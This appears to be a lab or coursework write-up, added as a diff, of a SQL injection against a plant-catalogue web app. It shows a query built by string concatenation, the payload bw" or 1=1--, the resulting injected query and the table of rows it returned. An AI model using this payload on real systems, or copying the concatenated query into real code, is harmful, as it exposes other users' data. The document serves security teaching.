@@ -1,0 +1,46 @@
+SQL search string:
+var sql_query = 'SELECT id , name , color , planttype , potsize , shared FROM
+plants WHERE user_id =' + user_id + ' AND name LIKE "% ' + plant + '%"; ';
+
+Exploit string to search: bw" or 1=1--
+
+=> SQL string after injection: var sql_query = 'SELECT id , name , color , planttype , potsize , shared FROM
+plants WHERE user_id =' + user_id + ' AND name LIKE "%bw" or 1=1-- %"; ';
+
+Table returned below
+
+arctic bulb	green	extict	20 liter	
+Asian bulb	lemon	livewort	9 in	
+Australian berry	carmine	algae	tall	
+autumn chili	magnolia	fern	huge	
+bog tomato	wisteria	toadstool	4 liter	
+city kumquat	light silver	extict	30 cm	
+colorful berry	white	kewl	15 cm	
+colorful orange	marigold	gynkgo	XL	
+colorful tulip	green	unwanted gift	huge	
+Eastern blueberry	plum	moss	4 liter	
+European raspberry	bright indigo	invasive	2 liter	
+farm agave	wisteria	unwanted gift	tiny	
+fashionable mushroom	sugar	weed	5 liter	
+handsome cactus	marigold	birthday present	15 cm	
+Indian moss	magenta	toadstool	10 cm	
+low orange	ruby	gynkgo	7 liter	
+magic violet	sugar	unwanted gift	25 cm	
+Northern orchid	vanilla	flower	XXL	
+Northern raspberry	denim	expensive	2 ft	
+oceanic climber	purple	mandrake	6 liter	
+oceanic epiphyte	arctic pink	birthday present	XL	
+old yucca	purple	weed	tiny	
+peak tree	brown	moss	tiny	
+plains kiwi	titanium poppy	livewort	6 liter	
+plains kumquat	sugar	lovely	8 liter	
+river grass	pink	expensive	XL	
+river lily	brown	potty	20 cm	
+spring raspberry	brass	flower	bonsai	
+stinky potato	marigold	stolen	5 in	
+swamp fig	white	kewl	L	
+tall moss	violet	flower	35 cm	
+viral mushroom	neon white	extict	small	
+water orange	coffee	stolen	tall	
+Western pepper	white	potty	XXL	
+wide slime	plum	algae	L
